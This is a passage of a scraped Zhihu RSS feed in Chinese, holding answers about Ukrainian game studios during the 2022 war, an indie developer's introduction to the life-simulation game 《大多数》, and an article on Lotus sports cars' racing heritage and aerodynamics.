data-original-src=\"v2-eca56fec4714217e96f879e964182206\" data-watermark-src=\"v2-caac8d216b7c0f21999c83305741baf9\" data-private-watermark-src=\"v2-8a1f4eb9563e63f7221e06bbb5b7c3c1\"></p>\n<p data-pid=\"3D8Iwxjy\"><b>目前状况:</b></p>\n<p data-pid=\"M5xbVBzm\">·和GSC一样惨，游戏开发处于中断状态，厂商正在为乌克兰军队募捐。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-428590e2899c2f7421acbc95925be362_720w.jpg?rss\" data-rawwidth=\"591\" data-rawheight=\"405\" data-size=\"normal\" data-watermark=\"original\" data-original-src=\"v2-428590e2899c2f7421acbc95925be362\" data-watermark-src=\"v2-2cc2294e9d7a48ca711a2dfd68771806\" data-private-watermark-src=\"v2-e976930e61389be48a24ed0cc3215594\"></p>\n<p data-pid=\"jQqLdKKq\"><b>3、RTS游戏厂商，战争之人系列游戏开发商Best Way</b></p>\n<p data-pid=\"UaeLoJ-Q\">它的总部在东乌克兰的顿涅茨克州，刚刚这个地方被大规模炮击，多所房屋被击毁。虽然饺子哥 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/972a7f6202fcca86f0d2dc3f3dd3047b\" data-hash=\"972a7f6202fcca86f0d2dc3f3dd3047b\" data-hovercard=\"p$b$972a7f6202fcca86f0d2dc3f3dd3047b\">@dumplingpro</a> 信誓旦旦的说，俄军进攻不会对游戏开发造成影响，但就目前的战况而言，我相信战争之人2与我们的见面，还要更晚一些。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2b537c94c0c75ac1db21e0e37042ea2d_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"战争之人2\" data-watermark=\"original\" data-original-src=\"v2-2b537c94c0c75ac1db21e0e37042ea2d\" data-watermark-src=\"v2-5b1d0be2c6a6fdb583678c64545adf3a\" data-private-watermark-src=\"v2-fc33183f86538d156bf60ee71191095a\"></p>\n<p data-pid=\"16X1iait\"><b>目前状况:</b></p>\n<p data-pid=\"bngUoA-m\">·有零星交火，开发可能遭遇威胁。</p>\n<p data-pid=\"J4k6h4Un\">4、 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/a9afec5b28a4e8ec55a05aaa3497f8ef\" data-hash=\"a9afec5b28a4e8ec55a05aaa3497f8ef\" data-hovercard=\"p$b$a9afec5b28a4e8ec55a05aaa3497f8ef\">@Epic游戏商城</a> 之前提的游戏非常应景，算得上是一款不错的策略游戏。</p>\n<p data-pid=\"oCqkDPuD\">具体可以看这个:</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/answer/2362171776\" data-image=\"https://pic2.zhimg.com/v2-a8bdb84efba56afc8f46a2ea90d7963a_bh.jpg\" data-image-width=\"1214\" data-image-height=\"682\" class=\"internal\">目前乌克兰局势动荡，乌克兰国内和附近国家（比如波兰）游戏公司们会受到影响吗？</a><p data-pid=\"7Zpkr73h\">这个游戏的厂商Starni Games的办公地点很不幸也在基辅。就目前的战局而言，这个游戏的后续更新和续作，也得难产了。</p>\n<p data-pid=\"r-iXbfzs\"><b>目前状况:</b>看看前面GSC和Frogwares这两位。</p>\n<p data-pid=\"nLprMLP6\"><b>5、城市建造游戏Ostriv。</b></p>\n<p data-pid=\"W5vU4S1Q\">目前开发团队正在乌克兰的工业重镇哈尔科夫。目前哈尔科夫发生炮战，城市状况非常差。抢先体验玩家得有点耐心。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-93acfcbdbd7299e64dcc93f698f90c7a_720w.jpg?rss\" data-rawwidth=\"460\" data-rawheight=\"215\" data-size=\"normal\" data-watermark=\"original\" data-original-src=\"v2-93acfcbdbd7299e64dcc93f698f90c7a\" data-watermark-src=\"v2-f389a93198755db78f73c9b2c7e4b897\" data-private-watermark-src=\"v2-5484d31555281d97a229a54445c0fbaf\"></p>\n<p data-pid=\"74owP003\"><b>目前状况:</b></p>\n<p data-pid=\"zD-S6mij\">·和在基辅的同行们相比半斤八两，都好不到哪去</p>\n<p data-pid=\"Z56en6GL\">·也在为乌克兰军队募捐，试图保卫乌克兰。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ebcb4e1d49603afc6042caecdd5014bd_720w.jpg?rss\" data-rawwidth=\"597\" data-rawheight=\"405\" data-size=\"normal\" data-watermark=\"original\" data-original-src=\"v2-ebcb4e1d49603afc6042caecdd5014bd\" data-watermark-src=\"v2-688f1c7cd48328c3c0e62a8ff7adad00\" data-private-watermark-src=\"v2-24b82b812d001befa3e0ab5f893aeac5\"></p>\n<p data-pid=\"Eit7VJC9\">除此之外，还有孤岛危机开发商Crytek，以及育碧在乌克兰的首都基辅都设有分部。Vostok Games这个末世免费大逃杀游戏的开发商也在基辅。</p>\n<p data-pid=\"VhyW7OiK\">还有更多更多的乌克兰游戏开发商我还没提到，但说实话，很难想象在这么动荡的地方，居然还能出产这么多优秀的游戏作品。</p>\n<h3>结语</h3>\n<p data-pid=\"JSAIjYIx\">愿战争早日平息，愿游戏作品的开发人员安好。</p>\n<p data-pid=\"uwNFUv27\">只有经历战争，才知和平珍贵。</p>\n<p data-pid=\"YcOkVlNY\">大概就这么多。</p>\n<hr>\n<h3>番外:目前战况</h3>\n<p data-pid=\"NBZhkVU8\">谈判已经破裂，俄军地面部队已经推进到基辅市中心的动物园，战况相当激烈。东部工业重镇哈尔科夫正在发生炮战。同时，空降部队已经抵达了乌克兰西部的利沃夫。乌克兰军队的有生力量已经陷入重围。</p>\n<p data-pid=\"I_HLxaQE\">基辅市内正在被大规模空袭和导弹袭击，城内状况很糟。全城大部分地区受到停电威胁，生活物资供应状况无法保证，只有一部分人躲进了地下室。地铁火车站人流量加大，防空警报拉响时，有乘客跑步逃离；街头空荡荡，外币兑换点数据显示屏清零、业务停摆。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/tan-chang-65?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">埃里希·克里斯汀</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/518459260/answer/2362270635?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">11 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/336532575?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">各位对于波兰蠢驴的新作赛博朋克2077有何看法？</a><br><a href=\"http://www.zhihu.com/question/328639300?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待赛博朋克2077刚开预购便已冲上steam热卖榜第一？</a><br>\n","link":"http://www.zhihu.com/question/518459260/answer/2362270635?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"「打工人」模拟器国产独立游戏《大多数》上架 Steam，有哪些亮点值得关注？","date":"2022-02-25 08:14:17","description":"\n<p data-pid=\"x7POSCVe\">大家好，我是《大多数》游戏的制作人，杂草，很高兴在知乎和大家聊聊我们的游戏~</p>\n<p data-pid=\"w-MMO8Be\">大多数这款游戏立项已有一年半了，目前开发的情况应该完成了大概70%的内容，对我来说是非常快了，感谢和我们一起奋战的同事，实说到现在为止我的状态还是很恍惚的，看着各大平台的哪些曾经自己关注的UP主和主播在游玩自己的游戏时，那种不真实感一度让我有点眩晕，完全没有想到游戏的测试获得了这么多的关注，十分的荣幸的同时，也感到了一丝欣慰，毕竟国产单机游戏一路走来，感觉终于到了春暖花开的时刻了，当然对于我们来说战斗才刚刚开始，我们会利用最后几个月努力的完善自己的产品，争取在正式上线的时候不负玩家们的期待。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fb313c01f563ae14cfa4716a78cb303f_720w.png?rss\" data-caption=\"小团团在试玩我们的游戏\" data-size=\"normal\" data-rawwidth=\"558\" data-rawheight=\"370\" data-watermark=\"watermark\" data-original-src=\"v2-fb313c01f563ae14cfa4716a78cb303f\" data-watermark-src=\"v2-e0126831a932615dd3d98731b9a239c6\" data-private-watermark-src=\"v2-a7fb3411d8c2059ffab63cc83e566a74\"></p>\n<p data-pid=\"bgMsJXGS\">目前游戏的demo放出后我们终于可以完整的向玩家介绍我们的作品了，因为之前的宣传视频我感觉没有很明确的表达出游戏的理念，很多人并不清楚我们的游戏玩法。首先我们定位她是一款模拟经营游戏，一方面是因为我和我的合伙人1D都是重度的模拟经营游戏爱好者，我们在第一次制作自己的单机游戏作品的时候就很自然的希望制作自己喜欢的游戏类型，我们认为自己作为此类型的游戏的玩家，可以尽可能全面的评价游戏的完成度和质量，另一方面是我们认为模拟经营是可以更客观的展示一些内容的，我们并不希望以说教者的姿态出现在玩家面前，去做一些内容的灌输，我们更认可席勒梅尔对于游戏的定义：游戏是一系列有趣的选择，我们也希望通过制作一款内容丰富的模拟游戏，让玩家在这座城市中谱写自己的故事。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e790adfbcac52ff64b2316e20b095391_720w.png?rss\" data-caption=\"steam游戏人数45000峰值\" data-size=\"normal\" data-rawwidth=\"555\" data-rawheight=\"333\" data-watermark=\"watermark\" data-original-src=\"v2-e790adfbcac52ff64b2316e20b095391\" data-watermark-src=\"v2-65d0e6112cea72a7685e66ddd1103976\" data-private-watermark-src=\"v2-f99a75a2fbabbc7000de6dc4a8c31c80\"></p>\n<p data-pid=\"3n1JMLQu\">在游戏刚放出宣传片的时候，有网友在讨论这个游戏的价值取向。但当试玩版出来时，这种讨论几乎绝迹了。原因很简单——这是一款模拟经营游戏。模拟经营这种游戏类型，就注定了她积极向上的主题。玩家在游戏中通过努力，追求更好的结果，是这种游戏类型的唯一选择。而事实上，追求幸福也是现实世界中我们大多数人为之奋斗的目标。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6515371a91048c4aec8e2f1e76205965_720w.png?rss\" data-caption=\"《大多数》的角色成长\" data-size=\"normal\" data-rawwidth=\"553\" data-rawheight=\"309\" data-watermark=\"watermark\" data-original-src=\"v2-6515371a91048c4aec8e2f1e76205965\" data-watermark-src=\"v2-fe044d7fc8bf837b2f258d59840921af\" data-private-watermark-src=\"v2-af4e15f0ee78e26d1664ae435a2bde80\"></p>\n<p data-pid=\"bVFQqIvY\">游戏目前规划是由3个独立的剧本，包含两个男性角色，和一名女性角色的独立故事以及一个自由模式组成，每个剧本都会有自己独立的故事和任务目标，玩家将在三个独立的故事中逐渐适应如何在游戏这个环境中生存下来，通过一些手段提高自己的收入，最终过上幸福的生活，然后游戏将开放一个自由的沙盒模式，玩家可以自由的在这座城市探索，经营自己的角色，剧情模式会出现一些强制的开局，比如第一幕玩家一进入游戏便身负债务，但结局一定是开放的，由玩家自己努力而来的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-06004445138f8d04685e79c2972db91e_720w.png?rss\" data-caption=\"《大多数》的剧情规划\" data-size=\"normal\" data-rawwidth=\"551\" data-rawheight=\"310\" data-watermark=\"watermark\" data-original-src=\"v2-06004445138f8d04685e79c2972db91e\" data-watermark-src=\"v2-86d6486eb506675676aeff6e9e32a6a0\" data-private-watermark-src=\"v2-2c8a38da3eada5ad518f47ac76e4ecbc\"></p>\n<p data-pid=\"prMvuck4\">现在游戏开发已经进入冲刺阶段，我们正在努力的完善剧本和自由模式中玩家可体验的内容，希望玩家在正式版游戏中面对的是一个鲜活的有生活气息的城市，这也是我们的初衷所在，我们认为从城中村着眼，能更好的反应一个城市的下限，而也正是这个下限也能保证玩家的基本生存和发展时，我们认为这才是一个最能反应这个国家良性向好的趋势，在前期调研时我们的确能感受到我们的政府在这方面的工作，我们也希望在未来游戏发售时，能让全世界的其他玩家能看到我国政府在就业指导，职业培训，法律援助方面做出的努力，这是一件挺让我们自豪的事情。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-82fc33b9b6a1e71132a3686e0c9b9b60_720w.png?rss\" data-caption=\"试玩当天加班到凌晨两点\" data-size=\"normal\" data-rawwidth=\"559\" data-rawheight=\"418\" data-watermark=\"watermark\" data-original-src=\"v2-82fc33b9b6a1e71132a3686e0c9b9b60\" data-watermark-src=\"v2-eed2a25e06c93e66bcc4441b0accee41\" data-private-watermark-src=\"v2-addd3de771d4a09caa34a8b493a3613a\"></p>\n<p data-pid=\"2_CBVLEG\">最后在这里感谢一路走来共同战斗的同事们。感谢我们的策划，无数次玩法的反复斟酌，只为获得具有自由度、目标感、复玩性的游戏体验。感谢我们的美术，能够用极低的成本，营造出风格独特、细节满满的游戏画面。感谢我们的程序，一行一行代码敲出了这个令我们沉静其中的世界，谢谢你们。也希望我国的单机游戏事业能越来越好，让世界上更多的人能听到中国故事，熟悉中国文化！希望我们的作品能不负每一个认真生活过的人。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/justsoso-97-46?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">杂草</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/504379982/answer/2304695443?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">180 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/466361096?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有什么适合工作繁忙的打工人的游戏吗？</a><br><a href=\"http://www.zhihu.com/question/28877728?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">未来有没有可能出现一部实现玩所有平台游戏的机器而且无限向下兼容？</a><br>\n","link":"http://www.zhihu.com/question/504379982/answer/2304695443?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"为什么讨论超级性能跑车离不开路特斯？","date":"2022-02-25 03:14:22","description":"\n<p data-pid=\"yn8tHteX\">讨论极致跑车离不开路特斯这件事之前，咱们应该先好好的说一说，<b>什么叫极致跑车</b>？在我认为，一台跑车的本质，其实就是一种用来<b>追求驾驶乐趣的机器</b>，用更加灵活的车身和更强的动力换取快乐。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1c42daf8d390b44396f203b011b96781_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"617\" data-rawheight=\"411\" data-watermark=\"watermark\" data-original-src=\"v2-1c42daf8d390b44396f203b011b96781\" data-watermark-src=\"v2-7e9c54103663b96925c894c199b5763c\" data-private-watermark-src=\"v2-6812c11fc76ca6e6d47fd69fa3458293\"></p>\n<p data-pid=\"iwOY_rlS\">什么叫极致跑车呢？我觉得，赛车应该算是跑车的各种用途中，最为极致的用法。我眼中可以称为极致跑车的跑车都是<b>脱胎于赛场</b>的，甚至很多产品<b>可以被称为能上路的赛车</b>，所以，讨论极致跑车，绝对<b>是离不开路特斯的</b>。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2e065756210153005fa1d0866d41d0a7_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"695\" data-rawheight=\"391\" data-watermark=\"watermark\" data-original-src=\"v2-2e065756210153005fa1d0866d41d0a7\" data-watermark-src=\"v2-583a8f2cf199274e13e9bcc25a0b635c\" data-private-watermark-src=\"v2-95ad688f387ddbc59c93f849a83c4fc9\"></p>\n<p data-pid=\"UTCEoQg7\">从路特斯这个品牌的根儿上，他就是一个在运动方面追求极致的品牌，究竟有多极致，今天就来好好的聊一聊。</p>\n<hr>\n<h2><b>多年征战赛场</b></h2>\n<p data-pid=\"odNLqikN\">路特斯在赛车场上的成绩，可以说是大家有目共睹的，81个F1分站赛冠军、7个F1厂商年度总冠军、6个F1车手年度总冠军、9个勒芒大奖赛分组冠军……等等这些成绩，不仅仅是看起来亮眼，背后更是充满了各种努力。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-688a8fe059541943b2fc876c92feb47d_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"627\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-688a8fe059541943b2fc876c92feb47d\" data-watermark-src=\"v2-6612bf2aa8beadafb75714aaf6894a92\" data-private-watermark-src=\"v2-75ef65ce53b2b1694c093a801a868b81\"></p>\n<p data-pid=\"a7htn7QP\">路特斯这个品牌首个车型，乃至前十几款车型，都是<b>专门为参加各种比赛打造的赛车</b>，路特斯Mark 1是<b>创始人柯林·查普曼在1948年</b>为了参加当时的750赛车俱乐部比赛而自己研究改制的产品，并且旗开得胜。<b>自己为自己造赛车并参加比赛</b>，并且取得多个冠军，这件事是相当厉害的</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0d56721aec5c7f09a28b9a26118124fa_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"661\" data-rawheight=\"504\" data-watermark=\"watermark\" data-original-src=\"v2-0d56721aec5c7f09a28b9a26118124fa\" data-watermark-src=\"v2-d27f51672a1605288a3fdc032f35bc8c\" data-private-watermark-src=\"v2-5c14224fc57de4528b6c4bee25ee4b5f\"></p>\n<p data-pid=\"G1tnl9L4\">柯林·查普曼是一名爱车的赛车手，他能自己造车，能在赛道夺冠，很快就变得声名显赫，找他帮忙改车的人也越来越多。直到有了Vanwall车队老板请他前去改车，并<b>在1958年助其获得F1第一届车队冠军，路特斯的赛道技术已然站在世界之巅</b>。<b>一个诞生于赛场的品牌</b>，造出来的跑车，个个都是极致的存在，因此纵观路特斯的造车历史，其中能被称为极致跑车的产品，真的太多了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8ba13635b3e2251a2bf9c261678ad315_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"695\" data-rawheight=\"391\" data-watermark=\"watermark\" data-original-src=\"v2-8ba13635b3e2251a2bf9c261678ad315\" data-watermark-src=\"v2-df1bca85695bf9be2f006010f107ddb8\" data-private-watermark-src=\"v2-4a3f5d62a64e551a263e1483aa72634a\"></p>\n<hr>\n<h2>极致空气动力学</h2>\n<p data-pid=\"sCY3W2As\">作为一个脱胎于赛场的品牌，路特斯深谙与空气打交道，创始人柯林·查普曼原本是一名空军飞行员，他曾在天空驾驶着轻盈的飞机，借助着空气的力量飞翔，在造车过程中，他其实一直有把<b>航空方面的技术应用到汽车</b>身上的想法。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d66fb21315984e0a1497d569d3fca2bc_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"618\" data-rawheight=\"458\" data-watermark=\"watermark\" data-original-src=\"v2-d66fb21315984e0a1497d569d3fca2bc\" data-watermark-src=\"v2-a52f95a90565b09ee333ea477bf55853\" data-private-watermark-src=\"v2-11f18785b04136bcddc76e6cac10ee30\"></p>\n<p data-pid=\"VusxRPj-\">最早在20世纪50年代初，柯林·查普曼的好友弗兰克·科斯廷就帮助他进行了汽车空气动力学方面的改善，因此，经过空气动力学改良的Mark VIII赛车就这样诞生了，他像飞机一样有<b>轻质管状车架</b>和简单的<b>金属蒙皮</b>，有着经过改良的<b>流动外形</b>。在测试过程中，弗兰克还亲自上阵，在车身上粘贴绒毛, 并把自己绑在前机盖上，观察绒毛在高速160km/h的车速下走向，最终用自己的硬核操作完成了这个简单有效的<b>风洞实验</b>。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-691ee0c7a9c7f7d6e29c0cbb6f1783ff_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"658\" data-rawheight=\"501\" data-watermark=\"watermark\" data-original-src=\"v2-691ee0c7a9c7f7d6e29c0cbb6f1783ff\" data-watermark-src=\"v2-b97a22111bbb025cf1c657a667c62a07\" data-private-watermark-src=\"v2-9790c74229bf0ef968d0bbea28a4ef02\" data-tags=\"politic\"></p>\n<p data-pid=\"NjeTWVxJ\"> 一台车重<b>500kg</b>，仅有<b>85马力</b>的赛车，却能够<b>轻松的达到200km/h</b>的车速，在当时，这是一个非常令人吃惊的快速度，因此，他在赛场上领先了搭载110马力发动机的对手，获得了胜利，柯林·查普曼尝到了<b>空气动力学和轻量化</b>的甜头，因此，在造车方面他一直非常的重视这两个方面。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5349deb33a848a0b9cd834588d7f6d27_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"554\" data-watermark=\"watermark\" data-original-src=\"v2-5349deb33a848a0b9cd834588d7f6d27\" data-watermark-src=\"v2-806ca75757d5a09ebab58e0aab150ca1\" data-private-watermark-src=\"v2-a95b8e30c6017f4f00be39eef192069e\"></p>\n<p data-pid=\"4W6p124e\">赛车是一项非常烧钱的运动，而查普曼依然热爱赛车，他不得不接更多的工程咨询服务补贴烧钱的赛车运动，因此也启动了造民用车的项目。1957年路特斯推出了Lotus Elite车型，是该公司首款民用车，在空气动力学上，这台近<b>70年前的车风阻只有0.29</b>，要知道现在很多民用车能做到0.30都算设计优秀了。这台车本身不是为了去跑比赛的，但依然有各路好手驾驶它参加勒芒等赛事。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-be18a1344b1ee8ce3a457bb41f6906e0_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"657\" data-rawheight=\"448\" data-watermark=\"watermark\" data-original-src=\"v2-be18a1344b1ee8ce3a457bb41f6906e0\" data-watermark-src=\"v2-053d8fe92085d195b9a54e86300ae186\" data-private-watermark-src=\"v2-4c01bf651813b37f9945651a6c85e204\"></p>\n<p data-pid=\"cEgh1J2m\">路特斯更是<b>第一个将空气动力学设计引入F1赛车的品牌</b>，1968年，路特斯Type 49正式带着空气动力学科技进入了F1赛场，用风翼引进空气的力量，这比让车更加流线型是更进一步的操作，让空气化作一种从大自然来的力量，牢牢的把车按在地上。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e45f5c9d9d4ff04c3a16592e78379b27_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"698\" data-rawheight=\"393\" data-watermark=\"watermark\" data-original-src=\"v2-e45f5c9d9d4ff04c3a16592e78379b27\" data-watermark-src=\"v2-c1f1abe8f135d9d26ee5744edc0228fb\" data-private-watermark-src=\"v2-09b961deefe31d812c507301ef743671\"></p>\n<p data-pid=\"oUZuMnWn\">看看现在的F1，在空气动力学方面各家也都各出奇招，在赛车的过程中，如果要是出现了碰撞，空气动力学部件受损，车辆的圈速会受到极大的影响。在平时我们跑比赛和做圈速过程中，尾翼和车身套件一旦有了变化或者损坏，转弯的过程中真的可以感受到不同的下压力带来的抓地力的鲜明变化，有的时候，失去下压力还有可能造成轮胎的异常磨损。其实空气动力学设计，就是让空气作为你可以利用的力量，牢牢的将车固定在道路上，路特斯让空气站在了他这一边。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5314ede1d4fe901d9eba488d7471a4ea_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"254\" data-watermark=\"watermark\" data-original-src=\"v2-5314ede1d4fe901d9eba488d7471a4ea\" data-watermark-src=\"v2-f3ccb743d88c2db4d064ac263f68ba8d\" data-private-watermark-src=\"v2-85556ec08f7d7ffe0a586c15ff1b413a\"></p>\n<p data-pid=\"6U_0yxwq\">这种传承，在路特斯最新的产品EVJIA和EMIRA身上，还是能够看到的，特别是EVJIA作为一台电动车，机械结构与燃油车不同，因此做了非常大胆的空气动力学设计，最明显的是车后部两个“大洞”，来头不小，据称该车最大能产生<b>1.8吨的下压力</b>，要知道一般超跑能有200公斤下压力就不错了，这近十倍的体量，可见路特斯对于极致空气动力学的追求。虽然动力形式变了，但是路特斯的初心是完全没有动摇的，<b>他的极致，体现在对于空气动力学的不断追求</b>。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f3b3b0bf265bbcef6da28fc454c0e3cc_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"721\" data-rawheight=\"406\" data-watermark=\"watermark\" data-original-src=\"v2-f3b3b0bf265bbcef6da28fc454c0e3cc\" data-watermark-src=\"v2-65335e8ad83c38c3ec7b79db976fdd59\" data-private-watermark-src=\"v2-3a953e87c8112b415aaf7b2a6172d290\"></p>\n<hr>\n<h2>轻量化一脉相承</h2>\n<p data-pid=\"4iK7v6Jq\">刚才提到的路特斯Type 49，有着另外的一个杀手锏——<b>结构受力发动机</b>，简单说来就是让发动机作为车身受力结构的一部分，结构得到优化的好处才能够更彻底的降低车重。这个结构其实在很多摩托车上能看到，这确实是降低车重的一个好方式，以至于现在，很多赛车都用的是路特斯创新出来的这种设计。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-f119174a63d874681f5f72e83436cc5d_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"647\" data-rawheight=\"431\" data-watermark=\"watermark\" data-original-src=\"v2-f119174a63d874681f5f72e83436cc5d\" data-watermark-src=\"v2-b5d3a13dc157c7d3d618506a1bbaa0d2\" data-private-watermark-src=\"v2-d795d4722af45a1e9add973fe63711b3\"></p>\n<p data-pid=\"AH8a9hJK\">路特斯的跑车，绝对不是“力大砖飞”型的，不需要过分炸裂的动力，拥有<b>一个轻量化且空气动力学优秀的躯壳，有一个恰到好处的动力，就足够实现跑得快这个目的了</b>，这其实才是一种极致的体现。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-55d9505e5d9644b084e3e6526b8ac2f4_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"710\" data-rawheight=\"474\" data-watermark=\"watermark\" data-original-src=\"v2-55d9505e5d9644b084e3e6526b8ac2f4\" data-watermark-src=\"v2-a007494ceab145839553f0c842f99751\" data-private-watermark-src=\"v2-a93d9c3884227dd4bda680fb48a28739\"></p>\n<p data-pid=\"S2NYyZa9\">最新的EVJIA车型，也把轻量化的作为了自己造车的核心，应用<b>碳纤维单体壳</b>的设定，加上很多独门的科技，让他<b>作为一台电动超跑，仅有1680kg</b>的体重，这个重量绝对是很多其他对手做不到的一个重量。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b8d936aa6f8e6ae835aa016753e9a6a8_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"664\" data-rawheight=\"340\" data-watermark=\"watermark\" data-original-src=\"v2-b8d936aa6f8e6ae835aa016753e9a6a8\" data-watermark-src=\"v2-33b23f8e214f3e204b688e76c1872ed1\" data-private-watermark-src=\"v2-7011ebd825d00f5bb836dc87e76efa30\"></p>\n<p data-pid=\"YfCmVVta\">路特斯品牌从赛车到民用车都贯彻轻量化的核心，为什么一直这么极致的追求轻量化？因为轻量化就意味着更加灵活的动态特性，开一台轻盈的车不论是跑赛道，还是真正的跑比赛，都能够带来更好的感受。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-cc0c36ab057f9fa10c16b474e47c7d1a_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"689\" data-rawheight=\"388\" data-watermark=\"watermark\" data-original-src=\"v2-cc0c36ab057f9fa10c16b474e47c7d1a\" data-watermark-src=\"v2-3a58d4611f692ea6bc47fdad3201940e\" data-private-watermark-src=\"v2-d885fe14fffa9e58fbe96741394fbde0\"></p>\n<hr>\n<p data-pid=\"NDwsWBAB\">更轻的车身，更好的空气动力学，路特斯在造上路行驶的车型和赛车的时候秉承了完全相同的初心：<b>将驾驶作为核心，一直不变的传承</b>，让路特斯成为了极致跑车这个话题中绕不过去的一个品牌。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8f4e07837ce3178467ec1b996792c7f3_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"686\" data-rawheight=\"386\" data-watermark=\"watermark\" data-original-src=\"v2-8f4e07837ce3178467ec1b996792c7f3\" data-watermark-src=\"v2-19e914c267f48b563cf6f7262412bb78\" data-private-watermark-src=\"v2-3004ac7b0e0e21359c2cf5fdde24f18c\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/lu-chao-38-64?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">鲁超</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/517824705/answer/2363157711?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">21 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/21348236?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎么解释，运动跑车？性能跑车？超级跑车？</a><br><a href=\"http://www.zhihu.com/question/43970914?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">电动轿车优异的加速性能是否会降低跑车存在的意义？</a><br>\n","link":"http://www.zhihu.com/question/517824705/answer/2363157711?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"在 Windows 上快速安装 Hexo · 安装 Node.js","date":"2022-01-14 